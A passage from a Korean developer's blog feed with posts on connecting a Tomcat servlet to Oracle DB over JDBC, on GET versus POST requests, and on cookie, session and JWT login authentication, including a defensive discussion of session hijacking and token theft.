  <li><a href="https://gent.tistory.com/407">오라클 INSERT 방법 &amp; 노하우 정리 (데이터 입력)</a></li>
  <li><a href="https://dololak.tistory.com/756"> 오라클 ORA-01950: 테이블스페이스 ‘USERS’에 대한 권한이 없습니다 오류 해결 방법</a></li>
  <li><a href="https://m.blog.naver.com/cksgy32/221675944029">SQLD ORA-01950: 테이블스페이스 ‘USERS’에 대한 권한이 없습니다.</a></li>
  <li><a href="https://hengbokhan.tistory.com/78">Oracle BIN$…형식의 테이블 완전히 삭제하기</a></li>
  <li><a href="https://bangu4.tistory.com/320">오라클 계정,권한 관리 (tistory.com)</a></li>
  <li><a href="https://m.blog.naver.com/deersoul6662/221466474481">oracle 모든 유저, 데이터 베이스, 테이블 확인 : 네이버 블로그 (naver.com)</a></li>
  <li><a href="https://ajdahrdl.tistory.com/2">Oracle 계정 생성 및 권한 부여 방법 (tistory.com)</a></li>
  <li><a href="https://loghada.tistory.com/4">Oracle DB 계정 생성/사용자 확인</a></li>
  <li><a href="https://www.ibm.com/docs/ko/i/7.1?topic=language-removing-rows-from-table-using-delete-statement">DELETE문을 사용하여 테이블에서 행 제거 - IBM Documentation</a></li>
</ul>
</details>]]></content><author><name>Jung MinGyu</name></author><category term="Oracle DB" /><category term="Database" /><summary type="html"><![CDATA[오라클 db로 계정 생성, 테이블 생성, 데이터 삽입을 해보자.]]></summary></entry><entry><title type="html">웹서버 개발 6</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C6/" rel="alternate" type="text/html" title="웹서버 개발 6" /><published>2023-04-10T00:00:00+09:00</published><updated>2023-04-10T22:06:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C6</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C6/"><![CDATA[<h3 id="오라클-db-와-연동하기">오라클 DB 와 연동하기</h3>
<hr />
<h4 id="testjavaproject-에서-오라클-db-와-연결하기-위한-코드">TestJavaProject 에서 오라클 db 와 연결하기 위한 코드</h4>
<ol>
  <li><code class="language-plaintext highlighter-rouge">Class.forName</code> 함수를 통해 오라클 JDBC Driver를 로드한다.</li>
  <li><code class="language-plaintext highlighter-rouge">DriverManager.getConnection</code> 함수를 이용하여 <strong>오라클DB</strong> 서버와 연결하였다.</li>
  <li>쿼리를 주어 테이블에서 데이터를 읽어오거나 데이터를 삽입할 수 있다.</li>
  <li>마지막으로 <code class="language-plaintext highlighter-rouge">conn.close();</code> 함수를 이용하여 db 연결을 끊는다.</li>
</ol>

<ul>
  <li>아래의 코드는 <code class="language-plaintext highlighter-rouge">TEST</code> 라는 테이블에서 데이터를 꺼내오는 것이다.<br /><script src="https://gist.github.com/MinGyu2/84d7986953182e41729c772a5c9988c2.js"></script></li>
  <li>프로젝트 구조는 다음과 같다.<br /><script src="https://gist.github.com/MinGyu2/aecd0ef9557cfc64392751a5e89ddf0e.js"></script></li>
  <li>App.java 의 <code class="language-plaintext highlighter-rouge">doPost</code> 부분도 고쳐보자.</li>
  <li><code class="language-plaintext highlighter-rouge">String s = db.getUsers();</code> 즉 위에서 만든 <code class="language-plaintext highlighter-rouge">getUsers</code> 함수를 호출하여 db의 내용을 가져올 수 있다.<br /><script src="https://gist.github.com/MinGyu2/a3b054d36fbb2b7b92f46922e179a591.js"></script></li>
  <li>프로젝트를 컴파일 하고 컴파일한 결과를 <code class="language-plaintext highlighter-rouge">WEB-INF/classes/</code> 로 옮겨주자. 옮긴  다음 톰캣을 재시작하자. 사이트에 들어가서 request 페이지로 Post 요청을 하면 다음과 같이 <code class="language-plaintext highlighter-rouge">TEST 테이블</code>의 내용을 읽어올 수 있다.<br /><img src="https://user-images.githubusercontent.com/31990118/230882931-93d56fb5-9a9b-44c2-988d-2ea05ae7f6d9.png" alt="Pasted image 20230410175406" /><br /><img src="https://user-images.githubusercontent.com/31990118/230883009-7215843d-66f1-4ae5-afa3-cd6d118129a3.png" alt="Pasted image 20230410175309" /></li>
</ul>

<h3 id="발생했던-오류">발생했던 오류</h3>
<hr />
<h5 id="오류-내용">오류 내용</h5>
<ul>
  <li><code class="language-plaintext highlighter-rouge">java.lang.ClassNotFoundException: oracle.jdbc.driver.OracleDriver</code> 오류가 발생하였다. 해당 오류는 <code class="language-plaintext highlighter-rouge">orcale</code> 과 연결을 하기 위한 jdbc 파일을 못찾아서 발생한 오류이다.</li>
</ul>

<h5 id="해결법">해결법</h5>
<ol>
  <li>먼저 <a href="https://www.oracle.com/kr/database/technologies/appdev/jdbc-downloads.html">JDBC 다운 사이트</a> 에서 먼저 현재 사용중인 <code class="language-plaintext highlighter-rouge">Oracle DB</code> 버전에 맞는 창을 선택한다. 그다음 현재 서버에서 사용중인 JDK 버전을 지원하는 JDBC 를 다운 받는다.<br /><img src="https://user-images.githubusercontent.com/31990118/230883197-363d14b3-6ac9-4eba-af25-6b6133ddff9b.png" alt="Pasted image 20230410160406" /></li>
  <li>다운받은 JDBC 파일을 <code class="language-plaintext highlighter-rouge">WEB-INF/lib</code> 폴더에 넣어준다.<br /><script src="https://gist.github.com/MinGyu2/3eaef32da9891939cc7cb6028f9beec3.js"></script></li>
  <li>톰켓을 다시 시작하자.<br /><code class="language-plaintext highlighter-rouge">./apache-tomcat-10.1.7/bin/shutdown.sh</code> 톰캣 중지<br /><code class="language-plaintext highlighter-rouge">./apache-tomcat-10.1.7/bin/startup.sh</code> 톰캣 시작</li>
  <li>오류가 없어졌다!</li>
</ol>

<h5 id="오류-내용-1">오류 내용</h5>
<ul>
  <li><code class="language-plaintext highlighter-rouge">java.sql.SQLException: ORA-12541: Cannot connect. No listener at host localhost port 1521. (CONNECTION_ID=Y10z7f22RfCCr07I1wmkCg==)</code></li>
</ul>

<h5 id="해결법-1">해결법</h5>
<ul>
  <li><code class="language-plaintext highlighter-rouge">String dbURL = "jdbc:oracle:thin:@서버주소:1521:XE";</code> 주소를 맞게 적어주어야 한다.</li>
</ul>

<h5 id="오류-내용-2">오류 내용</h5>
<ul>
  <li><code class="language-plaintext highlighter-rouge">java.sql.SQLException: ORA-01017: 사용자명/비밀번호가 부적합, 로그온할 수 없습니다.</code></li>
</ul>

<h5 id="해결법-2">해결법</h5>
<ul>
  <li>사용자명과 비밀번호를 맞게 입력해야한다.</li>
</ul>

<h3 id="참고-사이트">참고 사이트</h3>
<hr />
<ul>
  <li><a href="https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&amp;blogId=jobberbell&amp;logNo=221149377915">oracle.jdbc.driver.OracleDriver 에러 해결방법</a></li>
  <li><a href="https://www.java4s.com/java-servlet-tutorials/how-to-connect-servlet-to-the-database-with-example/">How to Connect Servlet to the Database (Oracle) with Example (java4s.com)</a></li>
  <li><a href="https://vhxpffltm.tistory.com/131">서블릿과 데이터베이스 연동 조회: PrepareStatement (tistory.com)</a></li>
  <li><a href="https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&amp;blogId=robinnw&amp;logNo=220000301263">서블릿 오라클DB연동 - Servlet&amp;JDBC (insert , select SQL 사용)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Oracle DB" /><category term="nginx" /><category term="tomcat" /><category term="servlet" /><summary type="html"><![CDATA[오라클 DB 와 웹 서버 연동 테스트]]></summary></entry><entry><title type="html">웹서버 개발 5</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C5/" rel="alternate" type="text/html" title="웹서버 개발 5" /><published>2023-04-09T00:00:00+09:00</published><updated>2023-04-09T22:06:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C5</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C5/"><![CDATA[<h3 id="post-와-get-동작-확인">POST 와 GET 동작 확인</h3>
<hr />
<ul>
  <li>GET<br /><script src="https://gist.github.com/MinGyu2/1ed4e7cc1b3cef438c72952254e3efd2.js"></script><br /><img src="https://user-images.githubusercontent.com/31990118/230756591-dd06327e-4753-456e-a601-ceb8da120991.png" alt="Pasted image 20230406195223" /></li>
  <li>POST<br /><script src="https://gist.github.com/MinGyu2/95a11b93e1f2b786ecae35f7c1b3983a.js"></script><br /><img src="https://user-images.githubusercontent.com/31990118/230756773-384d8902-197e-416d-8e87-f6e9e8bda51a.png" alt="Pasted image 20230406195234" /></li>
  <li><code class="language-plaintext highlighter-rouge">form</code> 태그 안의 <strong>action</strong> 은 목적지가 적힌다.</li>
  <li>위의 GET의 submit 버튼을 누르면 다음과 같은 링크로 이동이 된다.<br /><code class="language-plaintext highlighter-rouge">http://주소/request_get?data=test</code><br />데이터가 링크에 그대로 노출되는것을 확인할 수있다.</li>
  <li>POST의 submit 버튼을 누르면 링크는 다음과 같다.<br /><code class="language-plaintext highlighter-rouge">http://주소/request_post</code> <br />Post 방식에서는 데이터의 내용을 링크에 안보여 준다.<br />요청을 좀 더 자세히 살펴보면 (Burp suite 를 이용) 다음과 같이 전송 방식은 post이고 data에 데이터를 담아 요청을 보내는것을 확인할 수있다.<br /><img src="https://user-images.githubusercontent.com/31990118/230756791-9730f16e-8069-4a44-adc5-39173d72d07b.png" alt="Pasted image 20230406195842" /><br /><img src="https://user-images.githubusercontent.com/31990118/230756809-759edb0e-76f3-4886-a997-d526365325ae.png" alt="Pasted image 20230406195858" /></li>
</ul>

<h3 id="get-방식-데이터-서버에서-받기">GET 방식 데이터 서버에서 받기</h3>
<hr />
<ul>
  <li>servlet 을 이용하였다. <strong>doGet</strong> 함수를 Override 하여 재정의 해주었다. 그리고 uri로 <code class="language-plaintext highlighter-rouge">get</code>요청이 왔을 때 다음 사진과 같이 나오도록 하였다.<br /><img src="https://user-images.githubusercontent.com/31990118/230756827-1b50ac46-2848-416a-b4a9-46b45d62cd75.png" alt="Pasted image 20230406203701" /><br /><img src="https://user-images.githubusercontent.com/31990118/230756840-22065fec-38fe-4c64-aac6-254e28e51dfd.png" alt="Pasted image 20230406203717" /><br /><script src="https://gist.github.com/MinGyu2/485877dfa8e372b4572c970d12b29c8d.js"></script><br /><script src="https://gist.github.com/MinGyu2/074dd3e21dbed0379e4817fee80eaf24.js"></script></li>
</ul>

<h3 id="post-방식-데이터-서버에서-받기">POST 방식 데이터 서버에서 받기</h3>
<hr />
<ul>
  <li>
    <p>servlet 을 이용하였다. <strong>doPost</strong> 함수를 override 하여 재정의 해주었다. 그리고 <code class="language-plaintext highlighter-rouge">post</code> 요청이 왔을 때 다음 사진과 같이 나오도록 하였다.<br /><img src="https://user-images.githubusercontent.com/31990118/230756911-68b243b5-85e4-4560-8ae5-930bf98f913d.png" alt="Pasted image 20230409131539" /><br /><img src="https://user-images.githubusercontent.com/31990118/230756917-b9ab099c-6016-4401-844c-fe40a40a9484.png" alt="Pasted image 20230409131610" /><br /><script src="https://gist.github.com/MinGyu2/34767a4d7ae12380cb4115ded3c76132.js"></script><br /><script src="https://gist.github.com/MinGyu2/074dd3e21dbed0379e4817fee80eaf24.js"></script></p>
  </li>
  <li>
    <p>참고로 get 과 post  에서 사용하는 requestPage 부분의 함수는 같은 함수이다.</p>
  </li>
</ul>

<h3 id="참고-사이트">참고 사이트</h3>
<ul>
  <li><a href="https://lasbe.tistory.com/83">Html form 태그와 input 요소들, GET / POST 방식 (tistory.com)</a></li>
  <li><a href="https://velog.io/@jsj3282/MVC-%ED%8C%A8%ED%84%B4-%EA%B5%AC%ED%98%842-%EB%AA%A8%EB%8D%B8-2-%EA%B5%AC%EC%A1%B0%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-MVC-%ED%8C%A8%ED%84%B4">MVC 패턴 구현(2) : 모델 2 구조를 이용한 MVC 패턴(1)</a></li>
  <li><a href="https://initialcommit.com/blog/how-to-send-data-from-servlet-to-jsp">How to send data from Java Servlet to JSP </a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="GET" /><category term="POST" /><category term="servlet" /><category term="jsp" /><category term="html" /><summary type="html"><![CDATA[get 과 post에 대해 알아보고, 직접 테스트 해보자]]></summary></entry><entry><title type="html">로그인 인증 방식</title><link href="http://localhost:4000/%EB%A1%9C%EA%B7%B8%EC%9D%B8%EC%9D%B8%EC%A6%9D%EB%B0%A9%EC%8B%9D/" rel="alternate" type="text/html" title="로그인 인증 방식" /><published>2023-04-08T00:00:00+09:00</published><updated>2023-04-08T22:06:00+09:00</updated><id>http://localhost:4000/%EB%A1%9C%EA%B7%B8%EC%9D%B8%EC%9D%B8%EC%A6%9D%EB%B0%A9%EC%8B%9D</id><content type="html" xml:base="http://localhost:4000/%EB%A1%9C%EA%B7%B8%EC%9D%B8%EC%9D%B8%EC%A6%9D%EB%B0%A9%EC%8B%9D/"><![CDATA[<h3 id="로그인">로그인</h3>
<ul>
  <li>웹서버는 원래 로그인이라는 기능이 없다.</li>
  <li>HTTP 프로토콜은 stateless 이다. 즉 연결성이 없다. 다시 요청을 할려면 다시 연결해야 한다. 즉 로그인 인증을 계속 해줘야한다.</li>
</ul>

<h3 id="인증-방식을-사용하는-이유">인증 방식을 사용하는 이유</h3>
<ul>
  <li>로그인을 하고 다음페이지로 이동할 때 또 로그인을 해야하는 사이트는 아주 불편할 것이다. 이러한 불편함을 없애고 사용자가 사이트 서비스를 편하게 이용하기 위해 <strong>인증 방식</strong>을 사용한다.</li>
</ul>

<h3 id="쿠키-인증-방식">쿠키 인증 방식</h3>
<hr />
<ul>
  <li>로그인 인증을 성공하면 쿠키에 인증정보를 저장한다.</li>
  <li>
    <p>이러한 쿠키와 함께 서버에 요청을 하면 로그인 인증할 필요없이 빠르게 서버와 상호작용이 가능하다.
<img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7tgbTrnbzsnbTslrjtirgoQSkgLT4-IOyEnOuyhDogaWQsIHB3ZCDsoITshqFcbuyEnOuyhCAtPj4g7ISc67KEIDog7Jyg7Zqo7ISxIOqygOyCrFxu7ISc67KEIC0-PiDtgbTrnbzsnbTslrjtirgoQSkgOiDsnbjspp0g7ISx6rO1ICsgbG9naW5Vc2VyKEEpIOy_oO2CpFxu7YG065287J207Ja47Yq4KEEpIC0-PiDshJzrsoQgOiDsmpTssq0gKyBsb2dpblVzZXIoQSkg7L-g7YKkXG7shJzrsoQgLT4-IO2BtOudvOydtOyWuO2KuChBKSA6IOydkeuLtShBIOygleuztCkiLCJtZXJtYWlkIjpudWxsfQ" /></p>
  </li>
  <li>하지만 공격자가 <strong>쿠키변조 공격</strong>을 이용하여 로그인을 할 수있는 취약점이 있다. 즉 쿠키를 위조하면 공격자가 쉽게 로그인이 가능하다. 따라서 쿠키를 이용해서 로그인을 하는 것을 하면 안된다.</li>
</ul>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOyalOyyrSArIGxvZ2luVXNlcihBKSDsv6DtgqRcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog7J2R64u1KEEg7KCV67O0KSIsIm1lcm1haWQiOm51bGx9" /></p>

<h3 id="서버기반-인증">서버기반 인증</h3>
<hr />
<h4 id="session-방식">Session 방식</h4>
<ul>
  <li>유저의 정보를 서버에 저장한다.</li>
  <li>서버에 인증정보를 브라우저가 아닌 서버 측에 저장하고 관리한다.</li>
  <li>클라이언트의 인증 상태정보를 저장한다.</li>
</ul>

<h4 id="인증과정">인증과정</h4>
<ul>
  <li>로그인에 성공하면 서버에서 session id 를 만든다. 그리고 이 session id를 쿠키에 담아 사용자에게 보낸다.
<img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7ruIzrnbzsmrDsoIAo7IKs7Jqp7J6QKSAtPj4gc2VydmVyIDog66Gc6re47J24IOyalOyyrVxuc2VydmVyIC0-PiBkYiA6IOuhnOq3uOyduCDsmpTssq1cbmRiIC0-PiBzZXJ2ZXIgOiDroZzqt7jsnbgg7J2R64u1XG5zZXJ2ZXIgLT4-IHNlc3Npb24g7KCA7J6l7IaMIDog7ZqM7JuQ7KCV67O0ICsgc2Vzc2lvbiBpZCDrsJzquIkg7JqU7LKtXG5zZXNzaW9uIOyggOyepeyGjCAtPj4gc2VydmVyIDogc2Vzc2lvbiBpZCDrsJzquIlcbnNlcnZlciAtPj4g67iM65287Jqw7KCAKOyCrOyaqeyekCkgOiDsnZHri7UgKyBzZXNzaW9uIGlkICjsv6DtgqTsl5Ag64Sj7Ja07IScIOyghOuLrCkiLCJtZXJtYWlkIjpudWxsfQ" /></li>
</ul>

<h4 id="session-id-를-통한-요청-과정">Session ID 를 통한 요청 과정</h4>
<ul>
  <li>서버에서 받은 session id와 요청을 서버에 보내면 서버는 session id를 이용하여 유저 정보를 획득한다.
<img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7ruIzrnbzsmrDsoIAoY2xpZW50IEEpIC0-PiBzZXJ2ZXIgOiDsmpTssq0gKyBjb29raWUgKHNlc3Npb24gaWQpXG5zZXJ2ZXIgLT4-IHNlc3Npb24g7KCA7J6l7IaMIDogc2Vzc2lvbiBpZCDsnbjspp0g7JqU7LKtXG5zZXNzaW9uIOyggOyepeyGjCAtPj4gc2Vzc2lvbiDsoIDsnqXshowgOiDqsoDspp1cbnNlc3Npb24g7KCA7J6l7IaMIC0-PiBzZXJ2ZXIgOiDsnKDsoIAg7KCV67O0IO2ajeuTnVxuc2VydmVyIC0-PiDruIzrnbzsmrDsoIAoY2xpZW50IEEpIDog7J2R64u1IiwibWVybWFpZCI6bnVsbH0" /></li>
  <li>장점
    <ul>
      <li>각각의 사용자는 고유의 session id 를 발급받기 때문에 일일이 회원정보를 확인할 필요가 없다.</li>
      <li>강제 로그아웃, 접속 인원 제한, 로그인 된 모든 디바이스를 서버에서 쉽게 확인이 가능하다.</li>
    </ul>
  </li>
  <li>단점
    <ul>
      <li>사용자 수가 늘어나면 session 저장소에 과부화가 걸린다.</li>
      <li>서버에서 세션 저장소를 위한 추가적인 저장공간이 필요하다.</li>
      <li>확장성이 띄어나지 않다. 서버가 늘어나면 세션 저장소를 외부로 분리하는 작업을 해야한다. 외부로 안보내면 세션 불일치 문제를 겪는다.</li>
      <li>제 3자가 session id 가 들어있는 쿠키를 탈취한 후 이 쿠키를 이용해 HTTP 요청을 보내면 서버는 사용자를 오인해 정보를 전달하게 된다.(하이재킹 공격)</li>
    </ul>
  </li>
  <li>하이재킹 공격 예방
    <ul>
      <li>HTTPS 프로토콜 사용 &amp; Session 만료시간 추가 로 어느정도 예방할 수 있다.</li>
      <li>서버 측에서 세션을 무효 처리 하면 된다.</li>
    </ul>
  </li>
</ul>

<h3 id="token-기반-인증">Token 기반 인증</h3>
<hr />
<ul>
  <li>유저의 정보를 서버에 저장하지 않는다.</li>
</ul>

<h4 id="jwt-json-web-token">JWT (JSON Web Token)</h4>
<ul>
  <li>Access Token 으로 사용된다.</li>
  <li>필요한 정보들을 암호화 시킨 토큰을 말한다.</li>
  <li>header, payload 그리고 verifiy signature 로 이루어져 있다.</li>
  <li><a href="https://jwt.io/">JSON Web Tokens - jwt.io</a><br /><img src="https://user-images.githubusercontent.com/31990118/230722780-5e188e72-e151-478a-bfb1-1b6e6b9ff7bf.png" alt="Pasted image 20230408185606" /></li>
</ul>

<h4 id="header">Header</h4>
<ul>
  <li>토큰의 타입을 나타내는 typ와 암호화할 방식을 정하는 alg으로 구성되어있다.</li>
  <li><code class="language-plaintext highlighter-rouge">alg</code> 에는 여러가지 공개키 암호화 방식중 하나의 알고리즘을 적어주면된다. (HS256, HS512, PS256 등)</li>
  <li>디코딩어 있다.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
'alg': 'HS256',
'typ': 'JWT'
}
</code></pre></div>    </div>
  </li>
</ul>

<h4 id="payload">Payload</h4>
<ul>
  <li>토큰에 담을 정보들이 포함된다.</li>
  <li>담는 정보의 한 조각을 <strong>클레임</strong>이라 한다.</li>
  <li>노출되기 쉬움으로 민감한 정보를 담아서는 안된다. 왜냐하면 인코딩만 되어있기 때문에 쉽게 디코딩이 가능하기 때문이다. 암호화가 걸려있는 것이 아니다.</li>
  <li><strong>식별 하기 위한 정보</strong>를 담아두어야 한다.</li>
  <li>여러개의 클레임을 넣을 수 있다.
    <ul>
      <li>iss (Issuer) : 토큰 발급자</li>
      <li>sub (Subject) : 토큰 제목, 토큰에서 사용자에 대한 식별값이 됨</li>
      <li>aud(Audience) : 토큰 대상자</li>
      <li>exp (Expiration Time) : 토큰 만료 시간</li>
      <li>nbf (Not Before) : 토큰 활성 날짜</li>
      <li>iat (Issued At) : 토큰 발급 시간</li>
      <li>ti (JWT Id) : JWT 토큰 식별자</li>
      <li>위의 크레임 또는 직접 추가해도 상관 없다.
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
'iss': 'asdfasdf'
..
'my_custom': 'customm'
}
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
</ul>

<h4 id="verify-signature">Verify Signature</h4>
<ul>
  <li>Header와 Payload가 위변조되지 않았다는 사실을 증명하는 문자열이다.</li>
  <li>Base64 로 인코딩된 header 와 payload를 합친후 비밀키로 암호화를 진행한다.</li>
  <li>암호화 알고리즘은 헤더에 적힌 알고리즘 방식을 사용해야한다.
```Verify_Signature
alg = HS256
HMACSHA256(
base64UrlEncode(header) + “.” +
base64UrlEncode(payload),
256 비밀키
)</li>
</ul>

<p>alg = PS512
RSAPSSSHA512(…)
```</p>

<h3 id="최종적으로-발급된-토큰access-token">최종적으로 발급된 토큰(Access Token)</h3>
<ul>
  <li><strong>Header.Payload.Signature</strong>  형태가 된다.<br /><img src="https://user-images.githubusercontent.com/31990118/230722926-c995599f-e18d-4786-940e-b8a4510bd256.png" alt="Pasted image 20230408191044" /></li>
  <li>제 3자가 토큰의 <code class="language-plaintext highlighter-rouge">payload 정보</code>를 변경하여 보내어도 비밀키를 알지 못하여 <code class="language-plaintext highlighter-rouge">signature 부분</code> 은 수정을 못한다. 따라서 서버는 payload에 변화가 있다는 것을 쉽게 탐지할 수 있다.</li>
</ul>

<h4 id="인증과정-1">인증과정</h4>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7ruIzrnbzsmrDsoIAo7IKs7Jqp7J6QKSAtPj4g7ISc67KEIDog7IKs7Jqp7J6QIOuhnOq3uOyduCDsmpTssq1cbuyEnOuyhCAtPj4g7ZqM7JuQIERCIOyEnOuyhCA6IOuhnOq3uOyduCDsmpTssq1cbu2ajOybkCBEQiDshJzrsoQgLT4-IOyEnOuyhCA6IOuhnOq3uOyduCDsnZHri7VcbuyEnOuyhCAtPj4g7ISc67KEIDogQWNjZXNzIFRva2VuIOuwnOq4iVxu7ISc67KEIC0-PiDruIzrnbzsmrDsoIAo7IKs7Jqp7J6QKSA6IOydkeuLtSArIEFjY2VzcyBUb2tlbiAo7L-g7YKkKSIsIm1lcm1haWQiOm51bGx9" /></p>

<h4 id="발급받은-토큰을-이용한-요청-과정">발급받은 토큰을 이용한 요청 과정</h4>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7ruIzrnbzsmrDsoIAo7IKs7Jqp7J6QKSAtPj4g7ISc67KEIDog7JqU7LKtICsgQWNjZXNzIFRva2VuKOy_oO2CpClcbuyEnOuyhCAtPj4g7ISc67KEIDogQWNjZXNzIFRva2VuIOqygOymnVxu7ISc67KEIC0-PiDruIzrnbzsmrDsoIAo7IKs7Jqp7J6QKSA6IOydkeuLtSIsIm1lcm1haWQiOm51bGx9" /></p>
<ul>
  <li>
    <p>Access Token 을 검증 할 때 서버의 공개키를 이용한다. <code class="language-plaintext highlighter-rouge">Verify Signature</code> 부분을 공개키로 복호화 하고 header와 payload 부분을 비교한다. 이상이 없으면 검증을 성공적으로 통과한 것이다.</p>
  </li>
  <li>장점
    <ul>
      <li>간편하다. 세션 저장소 처럼 별도의 저장소가 필요없다.</li>
      <li>JWT 발급 후 검증만 하면된다.</li>
      <li>확장성이 띄어나다. 서버가 늘어나면 세션 저장소를 외부로 분리하는 작업을 해줘야한다. 하지만 토큰은 서버에 저장을 안하여 이러한 문제로 부터 자유롭다.</li>
      <li>서버의 부담이 세션 방식보다 유리하다. 따로 저장소를 둘 필요가 없기 때문이다.</li>
    </ul>
  </li>
  <li>단점
    <ul>
      <li>세션키와 마찬가지로 사용자 토큰을 제 3자가 훔치고, 훔친 토큰을 이용하여 HTTP 요청을 보내면 서버는 사용자를 오인해 정보를 전달하게 된다.</li>
      <li>토큰이 한번 제 3자에게 탈취되면 해당 토큰이 만료되기 전까지 속수무책으로 피해를 입을 수 밖에 없다.</li>
      <li>세션 방식보다 훨씬 더 많은 네트워크 트래픽을 사용한다. 왜냐하면 head, payload, verify signature 을 사용하여 토큰을 만들기 때문이다.</li>
    </ul>
  </li>
</ul>

<h4 id="refresh-token-을-이용한-인증과정">Refresh Token 을 이용한 인증과정</h4>
<ul>
  <li><code class="language-plaintext highlighter-rouge">Access Token</code> 이 탈취 당할 것을 대비하여 유효기간을 짧게 하고 <code class="language-plaintext highlighter-rouge">Access Token</code> 이 만료되었을 때 새로 발급요청하는 열쇠가 된다.</li>
  <li><strong>Refresh Token</strong> 은 긴 유효기간을 가진다.</li>
  <li>예를 들면 <code class="language-plaintext highlighter-rouge">Access Token</code> 의 유효기간은 1시간, <strong>Refresh Token</strong> 의 유효기간은 1주라 하자. 그러면 <code class="language-plaintext highlighter-rouge">Access Token</code> 이 만료되더라도, <strong>Refrech Token</strong> 을 이용하여 <code class="language-plaintext highlighter-rouge">Access Token</code>을 새롭게 발급받으면 된다.</li>
  <li><code class="language-plaintext highlighter-rouge">Access Token</code> 과 같은 JWT 형태이다.</li>
</ul>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7ruIzrnbzsmrDsoIAo7IKs7Jqp7J6QKSAtPj4g7ISc67KEIDog7JqU7LKtICsgQWNjZXNzIFRva2VuKOy_oO2CpClcbuyEnOuyhCAtPj4g7ISc67KEIDogQWNjZXNzIFRva2VuIOunjOujjCDtmZXsnbhcbuyEnOuyhCAtPj4g67iM65287Jqw7KCAKOyCrOyaqeyekCkgOiBBY2Nlc3MgVG9rZW4g66eM66OMIOyLoO2YuFxu67iM65287Jqw7KCAKOyCrOyaqeyekCkgLT4-IOyEnOuyhCA6IEFjY2VzcyBUb2tlbiDrsJzquIkg7JqU7LKtKCsgQWNjZXNzIFRva2VuLCBSZWZyZXNoIFRva2VuKVxu7ISc67KEIC0-PiDshJzrsoQgOiBSZWZyZXNoIFRva2VuIOqygOymnSDtm4QsIOyDiOuhnOyatCBBY2Nlc3MgVG9rZW4g67Cc6riJXG7shJzrsoQgLT4-IOu4jOudvOyasOyggCjsgqzsmqnsnpApIDog7J2R64u1ICsg7IOI66Gc7Jq0IEFjY2VzcyBUb2tlbiDrsJzquIkiLCJtZXJtYWlkIjpudWxsfQ" /></p>
<ul>
  <li>장점
    <ul>
      <li>Access Token 을 가지고 있을 때 보다 안전하다.</li>
    </ul>
  </li>
  <li>단점
    <ul>
      <li>구현 방법이 복잡하다.</li>
      <li>Access Token 이 만료될 때마다 새롭게 발급하는 과정에거 HTTP 요청 횟수가 많아진다.</li>
    </ul>
  </li>
</ul>

<h3 id="참고-사이트">참고 사이트</h3>
<ul>
  <li><a href="https://velog.io/@adc0612/%EC%82%AC%EC%9A%A9%EC%9E%90-%EC%9D%B8%EC%A6%9D-%EC%9D%B8%EA%B0%80-Session">사용자 인증 - 세션 (velog.io)</a></li>
  <li><a href="https://velog.io/@junhok82/%EB%A1%9C%EA%B7%B8%EC%9D%B8%EC%9D%80-%EC%96%B4%EB%96%BB%EA%B2%8C-%EC%9D%B4%EB%A3%A8%EC%96%B4%EC%A7%88%EA%B9%8CCookie-Session">로그인은 어떻게 이루어질까❓(Cookie, Session) (velog.io)</a></li>
  <li><a href="https://velog.io/@dee0518/%EB%A1%9C%EA%B7%B8%EC%9D%B8-%EC%9D%B8%EC%A6%9D-%EB%B0%A9%EC%8B%9D">Web 로그인 인증 방식 (velog.io)</a></li>
  <li><a href="https://hudi.blog/self-made-jwt/">직접 만들어보며 이해하는 JWT (hudi.blog)</a></li>
  <li><a href="https://hudi.blog/session-based-auth-vs-token-based-auth/">세션 기반 인증과 토큰 기반 인증</a></li>
  <li><a href="https://tansfil.tistory.com/59">쉽게 알아보는 서버 인증 2편(Access Token + Refresh Token)</a></li>
  <li><a href="https://velog.io/@gusdnr814/%EB%A1%9C%EA%B7%B8%EC%9D%B8-%EC%9D%B8%EC%A6%9D-4%EA%B0%80%EC%A7%80-%EB%B0%A9%EB%B2%95#%EC%84%B8%EC%85%98%EA%B3%BC-%EC%BF%A0%ED%82%A4%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-%EC%9D%B8%EC%A6%9D">로그인 인증 4가지 방법 (velog.io)</a></li>
